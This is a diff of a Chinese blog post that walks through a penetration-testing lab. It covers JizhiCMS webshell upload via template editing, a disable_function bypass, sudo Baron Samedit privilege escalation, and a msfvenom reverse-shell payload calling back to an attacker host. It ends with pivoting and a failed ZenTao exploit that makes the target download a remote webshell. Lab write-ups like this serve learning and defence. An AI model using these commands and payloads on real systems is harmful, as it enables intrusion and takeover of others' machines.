@@ -292,7 +292,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>7.2k</span>
+              <span>7.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -312,137 +312,206 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <br>
-
-<h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><br>
-
-<p><img src="/posts/f33996e/1.png" alt="1.png"></p>
-<br>
-
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="外网机器-centos7"><a href="#外网机器-centos7" class="headerlink" title="外网机器 centos7"></a>外网机器 centos7</h4><p><code>vim /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
-<p><img src="/posts/f33996e/2.png" alt="截图"></p>
-<br>
-
+        <p><br></p>
+<h3 id="拓扑">拓扑</h3>
+<p><br></p>
+<figure>
+<img src="/posts/f33996e/1.png" alt="1.png">
+<figcaption aria-hidden="true">1.png</figcaption>
+</figure>
+<p><br></p>
+<h3 id="环境搭建">环境搭建</h3>
+<h4 id="外网机器-centos7">外网机器 centos7</h4>
+<p><code>vim /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
+<figure>
+<img src="/posts/f33996e/2.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
 <p><code>systemctl restart networl</code></p>
-<p><code>ifconfig</code>   ip为 <code>10.10.10.134</code></p>
-<br>
-
-<br>
-
-<br>
-
-<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sV 10.10.10.134</code></p>
+<p><code>ifconfig</code> ip为 <code>10.10.10.134</code></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<h3 id="外网打点">外网打点</h3>
+<h4 id="端口扫描">端口扫描</h4>
+<p><code>nmap -sV 10.10.10.134</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap 10.10.10.134 -sV</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 03:04 EDT</span><br><span class="line">Nmap scan report for 10.10.10.134</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 993 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">81/tcp   open  http    nginx</span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    nginx</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds</span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure>
-
-<br>
-
+<p><br></p>
 <p>81端口 极致CMS</p>
 <p>8888端口 宝塔</p>
 <p>80端口 就一个主页 dirsearch没扫到东西</p>
 <p>888端口 403</p>
-<br>
-
-<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Target: http://10.10.10.134:81/</span><br><span class="line"></span><br><span class="line">[03:10:56] Starting:                                                         </span><br><span class="line">[03:11:04] 200 -  479B  - /404.html                                         </span><br><span class="line">[03:11:04] 301 -  162B  - /A  -&gt;  http://10.10.10.134:81/A/                 </span><br><span class="line">[03:11:06] 403 -  548B  - /Public/                                          </span><br><span class="line">[03:11:12] 302 -    0B  - /admin.php  -&gt;  http://10.10.10.134:81/admin.php/Login/index.html</span><br><span class="line">[03:11:22] 301 -  162B  - /backup  -&gt;  http://10.10.10.134:81/backup/       </span><br><span class="line">[03:11:22] 403 -  548B  - /backup/                                          </span><br><span class="line">[03:11:24] 403 -  548B  - /cache/                                           </span><br><span class="line">[03:11:24] 301 -  162B  - /cache  -&gt;  http://10.10.10.134:81/cache/</span><br><span class="line">[03:11:32] 200 -    4KB - /favicon.ico                                      </span><br><span class="line">[03:11:36] 200 -  917B  - /index.html                                       </span><br><span class="line">[03:11:37] 200 -    0B  - /index.php/login/                                 </span><br><span class="line">[03:11:37] 200 -   14KB - /index.php                                        </span><br><span class="line">[03:11:37] 301 -  162B  - /install  -&gt;  http://10.10.10.134:81/install/     </span><br><span class="line">[03:11:37] 200 -   75B  - /install/index.php?upgrade/                       </span><br><span class="line">[03:11:37] 200 -   75B  - /install/</span><br><span class="line">[03:11:51] 200 -   22KB - /readme.txt                                       </span><br><span class="line">[03:11:51] 200 -  157B  - /robots.txt                                       </span><br><span class="line">[03:11:55] 200 -  490B  - /sitemap.xml                                      </span><br><span class="line">[03:11:57] 301 -  162B  - /static  -&gt;  http://10.10.10.134:81/static/       </span><br><span class="line">[03:12:02] 200 -  816B  - /web.config                                       </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>找到后台登录点 <code>admin.php</code> 好像除了这个 别的页面都访问不了…</p>
-<p>弱口令进入后台… （反正我没试出了/// ） admin/admin123</p>
-<p><img src="/posts/f33996e/3.png" alt="截图"></p>
+<p><br></p>
+<h4 id="目录扫描">目录扫描</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Target: http://10.10.10.134:81/</span><br><span class="line"></span><br><span class="line">[03:10:56] Starting:                                                         </span><br><span class="line">[03:11:04] 200 -  479B  - /404.html                                         </span><br><span class="line">[03:11:04] 301 -  162B  - /A  -&gt;  http://10.10.10.134:81/A/                 </span><br><span class="line">[03:11:06] 403 -  548B  - /Public/                                          </span><br><span class="line">[03:11:12] 302 -    0B  - /admin.php  -&gt;  http://10.10.10.134:81/admin.php/Login/index.html</span><br><span class="line">[03:11:22] 301 -  162B  - /backup  -&gt;  http://10.10.10.134:81/backup/       </span><br><span class="line">[03:11:22] 403 -  548B  - /backup/                                          </span><br><span class="line">[03:11:24] 403 -  548B  - /cache/                                           </span><br><span class="line">[03:11:24] 301 -  162B  - /cache  -&gt;  http://10.10.10.134:81/cache/</span><br><span class="line">[03:11:32] 200 -    4KB - /favicon.ico                                      </span><br><span class="line">[03:11:36] 200 -  917B  - /index.html                                       </span><br><span class="line">[03:11:37] 200 -    0B  - /index.php/login/                                 </span><br><span class="line">[03:11:37] 200 -   14KB - /index.php                                        </span><br><span class="line">[03:11:37] 301 -  162B  - /install  -&gt;  http://10.10.10.134:81/install/     </span><br><span class="line">[03:11:37] 200 -   75B  - /install/index.php?upgrade/                       </span><br><span class="line">[03:11:37] 200 -   75B  - /install/</span><br><span class="line">[03:11:51] 200 -   22KB - /readme.txt                                       </span><br><span class="line">[03:11:51] 200 -  157B  - /robots.txt                                       </span><br><span class="line">[03:11:55] 200 -  490B  - /sitemap.xml                                      </span><br><span class="line">[03:11:57] 301 -  162B  - /static  -&gt;  http://10.10.10.134:81/static/       </span><br><span class="line">[03:12:02] 200 -  816B  - /web.config                                       </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>找到后台登录点 <code>admin.php</code> 好像除了这个
+别的页面都访问不了...</p>
+<p>弱口令进入后台... （反正我没试出了/// ） admin/admin123</p>
+<figure>
+<img src="/posts/f33996e/3.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>发现当前版本为 v1.8.1 通过wapplyzer看到是 nginx</p>
-<br>
-
-<h4 id="文件上传-失败"><a href="#文件上传-失败" class="headerlink" title="文件上传(失败)"></a>文件上传(失败)</h4><p>在系统设置-&gt;基本设置-&gt;允许上传文件类型  添加 php后缀  然后再去找一个上传点</p>
-<p>在网站管理处–&gt;轮播图列表</p>
-<p>商品管理–&gt;商品列表 </p>
-<p><img src="/posts/f33996e/4.png" alt="截图"></p>
+<p><br></p>
+<h4 id="文件上传失败">文件上传(失败)</h4>
+<p>在系统设置-&gt;基本设置-&gt;允许上传文件类型 添加 php后缀
+然后再去找一个上传点</p>
+<p>在网站管理处--&gt;轮播图列表</p>
+<p>商品管理--&gt;商品列表</p>
+<figure>
+<img src="/posts/f33996e/4.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后提示不允许上传 ，用00截断这类的 都被重命名了 最终还是没绕过去</p>
-<p>去网上找了下极致CMS1.8.1版本相关漏洞 看到了这么篇文章 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p>
+<p>去网上找了下极致CMS1.8.1版本相关漏洞 看到了这么篇文章
+https://xz.aliyun.com/t/9359</p>
 <p>使用拓展管理插件getshell</p>
-<h4 id="模板编辑插件Getshell"><a href="#模板编辑插件Getshell" class="headerlink" title="模板编辑插件Getshell"></a>模板编辑插件Getshell</h4><p><img src="/posts/f33996e/5.png" alt="截图"></p>
+<h4 id="模板编辑插件getshell">模板编辑插件Getshell</h4>
+<figure>
+<img src="/posts/f33996e/5.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后使用这个在线编辑模板</p>
-<p><img src="/posts/f33996e/6.png" alt="截图"></p>
+<figure>
+<img src="/posts/f33996e/6.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后设置一个密码 这里设置为 123321 提交后进入了代码编辑器</p>
-<p><img src="/posts/f33996e/7.png" alt="截图"></p>
+<figure>
+<img src="/posts/f33996e/7.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后就可以通过这个编辑器去查看代码 写入一句话</p>
 <p>在index.php写一个phpinfo 然后成功生效</p>
-<p><img src="/posts/f33996e/8.png" alt="截图"></p>
-<p><img src="/posts/f33996e/9.png" alt="截图"></p>
-<h4 id="disable-function绕过"><a href="#disable-function绕过" class="headerlink" title="disable_function绕过"></a>disable_function绕过</h4><p>这样写一个一句话 用蚁剑连一下就可以了</p>
-<p><img src="/posts/f33996e/10.png" alt="截图"></p>
-<p>连上蚁剑之后没法执行命令，看了下phpinfo 禁用了好多函数 之前扫端口的时候扫到了有宝塔，应该是宝塔把函数给禁掉了</p>
-<p><img src="/posts/f33996e/11.png" alt="截图"></p>
-<br>
-
+<figure>
+<img src="/posts/f33996e/8.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/f33996e/9.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<h4 id="disable_function绕过">disable_function绕过</h4>
+<p>这样写一个一句话 用蚁剑连一下就可以了</p>
+<figure>
+<img src="/posts/f33996e/10.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>连上蚁剑之后没法执行命令，看了下phpinfo 禁用了好多函数
+之前扫端口的时候扫到了有宝塔，应该是宝塔把函数给禁掉了</p>
+<figure>
+<img src="/posts/f33996e/11.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
 <p>尝试下蚁剑绕过disable_function的插件</p>
 <p>使用这个<code>php7_GC_UAF</code> 可以成功绕过</p>
-<p><img src="/posts/f33996e/12.png" alt="截图"></p>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>后面拿第二台机器shell的时候要在这台机器上起一个ftp，普通权限起不来 然后就过来尝试下提权</p>
-<p>试了下之前爆出的 cve-2021-4034 提权没成功，找下msf自带的提权模块试试</p>
-<p>MSF专门提供了一个查找适用EXP的内置模块<code>Local Exploit Suggester</code> 然后给出了3个建议</p>
+<figure>
+<img src="/posts/f33996e/12.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<h4 id="提权">提权</h4>
+<p>后面拿第二台机器shell的时候要在这台机器上起一个ftp，普通权限起不来
+然后就过来尝试下提权</p>
+<p>试了下之前爆出的 cve-2021-4034
+提权没成功，找下msf自带的提权模块试试</p>
+<p>MSF专门提供了一个查找适用EXP的内置模块<code>Local Exploit Suggester</code>
+然后给出了3个建议</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; search suggester</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester                                        </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use 0</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this modu</span><br><span class="line">                                               le on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed descript</span><br><span class="line">                                               ion for the available exploi</span><br><span class="line">                                               ts</span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                 Information           Connection</span><br><span class="line">  --  ----  ----                 -----------           ----------</span><br><span class="line">  2         meterpreter x64/lin  www @ localhost.loca  10.10.10.114:3344 -&gt;</span><br><span class="line">            ux                   ldomain (uid=1001, g   10.10.10.134:43556</span><br><span class="line">                                 id=1001, euid=1001,   (10.10.10.134)</span><br><span class="line">                                 egid=1001) @ loca...</span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.134 - Collecting local exploits for x64/linux...</span><br><span class="line">[*] 10.10.10.134 - 41 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>这个pkexec 刚才试过了没成功，试一下sudo的这个</p>
 <p><img src="/posts/f33996e/18.png"></p>
 <p><img src="/posts/f33996e/19.png"></p>
 <p><img src="/posts/f33996e/20.png"></p>
-<p>运行完成后可看到生成了一个新的root账户<code>msf</code> 密码为 <code>nyyqeegzvjyfqa</code> ssh连一下试试  </p>
-<p>然后成功连上ssh 权限为root权限 </p>
-<p><img src="/posts/f33996e/21.png" alt="截图"></p>
+<p>运行完成后可看到生成了一个新的root账户<code>msf</code> 密码为
+<code>nyyqeegzvjyfqa</code> ssh连一下试试</p>
+<p>然后成功连上ssh 权限为root权限</p>
+<figure>
+<img src="/posts/f33996e/21.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>在root目录下发现了一个flag</p>
-<p><img src="/posts/f33996e/22.png" alt="截图"></p>
-<h3 id="横向第二台机器"><a href="#横向第二台机器" class="headerlink" title="横向第二台机器"></a>横向第二台机器</h3><p>直接上msf</p>
+<figure>
+<img src="/posts/f33996e/22.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<h3 id="横向第二台机器">横向第二台机器</h3>
+<p>直接上msf</p>
 <p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.10.114 lport=3344 -f elf &gt; 3344.elf</code></p>
-<p><img src="/posts/f33996e/13.png" alt="截图"></p>
-<br>
-
-<p>发现有两个网卡，一个网段为<code>10.10.10.0/24</code> (公网ip为 10.10.10.134)</p>
+<figure>
+<img src="/posts/f33996e/13.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<p>发现有两个网卡，一个网段为<code>10.10.10.0/24</code> (公网ip为
+10.10.10.134)</p>
 <p>另一个为 <code>10.0.20.0/24</code> (内网ip为10.0.20.30)</p>
-<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code>meterpreter &gt;  run post/multi/manage/autoroute</code></p>
+<h4 id="添加路由">添加路由</h4>
+<p><code>meterpreter &gt;  run post/multi/manage/autoroute</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: linux)                                                                 </span><br><span class="line">[*] Running module against localhost.localdomain                             </span><br><span class="line">[*] Searching for subnets to autoroute.                                      </span><br><span class="line">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table. </span><br><span class="line">[+] Route added to subnet 10.10.10.0/255.255.255.0 from host&#x27;s routing table.</span><br></pre></td></tr></table></figure>
-
-<h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/posts/f33996e/14.png" alt="截图">         </p>
-<p>(扫了好久没扫到，突然想到机器忘记开了…离谱)</p>
+<h4 id="端口扫描-1">端口扫描</h4>
+<figure>
+<img src="/posts/f33996e/14.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>(扫了好久没扫到，突然想到机器忘记开了...离谱)</p>
 <p>直接挂代理 用proxychains扫</p>
-<p><img src="/posts/f33996e/15.png" alt="截图"></p>
+<figure>
+<img src="/posts/f33996e/15.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>刚才用msf的portscan只扫到8080，用nmap扫一下</p>
 <p><code>proxychains nmap -sV 10.0.20.66</code> 扫了20分钟</p>
-<p><img src="/posts/f33996e/16.png" alt="截图"></p>
+<figure>
+<img src="/posts/f33996e/16.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>又发现了3306端口</p>
-<br>
-
+<p><br></p>
 <p>然后使用浏览器挂代理访问 10.0.20.66:8080 是个禅道cms</p>
-<p><img src="/posts/f33996e/17.png" alt="截图"></p>
+<figure>
+<img src="/posts/f33996e/17.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>查看源码 发现是 禅道v12.4.2 找下对应漏洞</p>
-<p>下班了 早点回去 明天再搞…</p>
+<p>下班了 早点回去 明天再搞...</p>
 <hr>
-<p>在网上找了下 只找到了该版本的后台getshell，只能尝试弱口令登录后台了…</p>
-<p><img src="/posts/f33996e/23.png" alt="截图"></p>
-<p>尝试5次自动锁了…然后我看了下wp,发现账号密码是 <code>admin</code>/<code>Admin123</code> 然后去试还是登录失败…(本地没登上去 kali登上去了 无语…)</p>
-<h4 id="ZenTao-后台getshell-失败"><a href="#ZenTao-后台getshell-失败" class="headerlink" title="ZenTao 后台getshell(失败)"></a>ZenTao 后台getshell(失败)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### Exp</span><br><span class="line">http://127.0.0.1/zentao/client-download-1-&lt;base64 encode webshell download link&gt;-1.html</span><br><span class="line">http://127.0.0.1/zentao/data/client/1/&lt;download link filename&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 需要在外网机器上起一个ftp服务 </p>
-<p><code>python -m pyftpdlib -p 21 -d .</code> 但是现在是普通用户 不知道权限够不够</p>
-<p>蚁剑传一个shell.php的一句话 </p>
-<p>shell地址 <code>ftp://10.0.20.30/shell.php</code>   </p>
+<p>在网上找了下
+只找到了该版本的后台getshell，只能尝试弱口令登录后台了...</p>
+<figure>
+<img src="/posts/f33996e/23.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>尝试5次自动锁了...然后我看了下wp,发现账号密码是
+<code>admin</code>/<code>Admin123</code>
+然后去试还是登录失败...(本地没登上去 kali登上去了 无语...)</p>
+<h4 id="zentao-后台getshell失败">ZenTao 后台getshell(失败)</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### Exp</span><br><span class="line">http://127.0.0.1/zentao/client-download-1-&lt;base64 encode webshell download link&gt;-1.html</span><br><span class="line">http://127.0.0.1/zentao/data/client/1/&lt;download link filename&gt;</span><br></pre></td></tr></table></figure>
+<p>需要在外网机器上起一个ftp服务</p>
+<p><code>python -m pyftpdlib -p 21 -d .</code> 但是现在是普通用户
+不知道权限够不够</p>
+<p>蚁剑传一个shell.php的一句话</p>
+<p>shell地址 <code>ftp://10.0.20.30/shell.php</code></p>
 <p>base64 <code>ZnRwOi8vMTAuMC4yMC4zMC9zaGVsbC5waHA=</code></p>
-<p>构建exp </p>
+<p>构建exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.20.66:8080/client-download-1-ZnRwOi8vMTAuMC4yMC4zMC9zaGVsbC5waHA==-1.html</span><br></pre></td></tr></table></figure>
-
-<p>访问后404 应该是外网机器权限太低 需要提权一下，再回到外网机器进行提权</p>
-<br>
-
+<p>访问后404 应该是外网机器权限太低
+需要提权一下，再回到外网机器进行提权</p>
+<p><br></p>
 <hr>
-<p>提到root后 再回来打这个exp 打算起一个ftp服务 但是没有这个库 而且也没安装pip </p>
+<p>提到root后 再回来打这个exp 打算起一个ftp服务 但是没有这个库
+而且也没安装pip</p>
 <p>那就考虑使用http去搞</p>
 <p>shell地址 <code>http://10.0.20.30:6688/shell.php</code></p>
 <p>base64 <code>aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
-<p>构造exp <code>http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
+<p>构造exp
+<code>http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=  </span><br><span class="line"># 第一个直接404</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDo5Njk2L3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/client-download-1-SFRUUDovLzEwLjAuMjAuMzM6NDU2Ny8xLnBocA==-1.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/client-download-1-MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==-1.html  404</span><br><span class="line">http://127.0.0.1/zentao/data/client/1/shell.php</span><br><span class="line"></span><br><span class="line">大写HTTP</span><br><span class="line"></span><br><span class="line">SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line"></span><br><span class="line">HTTP://10.0.20.30:3321/shell.php</span><br><span class="line">SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.30:3300/1.txt</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>尝试了好多次，只会创建一个空的shell.php 下载一句话一直失败 传不上去，然后后续我就在靶机上自行创建了一个一句话，然后访问页面可以正常访问，但是去连蚁剑啥的都连不上……无语</p>
-<p>基本上是第二台靶机的问题了，后面的就没法再继续下去了… </p>
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a target="_blank" rel="noopener" href="https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/">https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</a></p>
+<p>尝试了好多次，只会创建一个空的shell.php 下载一句话一直失败
+传不上去，然后后续我就在靶机上自行创建了一个一句话，然后访问页面可以正常访问，但是去连蚁剑啥的都连不上......无语</p>
